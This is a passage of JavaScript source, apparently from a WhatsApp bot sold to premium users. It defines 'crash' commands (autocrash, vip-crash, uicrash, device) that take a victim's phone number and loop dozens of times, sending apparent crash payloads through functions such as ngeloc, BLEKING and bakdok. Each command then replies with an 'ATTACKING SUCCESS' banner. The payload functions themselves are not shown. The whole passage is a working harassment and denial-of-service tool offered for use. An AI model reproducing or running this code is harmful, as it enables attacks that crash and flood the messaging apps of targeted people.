await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case 'haii-tamvan': case 'assalamualaikum': case 'anjir':  
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case 'autocrash': case 'tes': case 'crash-total':  
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case 'vip-crash': case 'memek': case 'pann-dipanggil': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(PannOfficiaL, target, " 💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥 ", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case 'uisystem': case 'uicrash': case 'bugui': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  💧⃟𒆜𝐏𝐚𝐧𝐧𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥𝟒𝟒𝟒⃟╳🐦‍🔥
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝟑.𝟏,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────【﻿𝐒𝐔𝐊𝐒𝐄𝐒𝐒】 ──────`)
break

case 'device': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
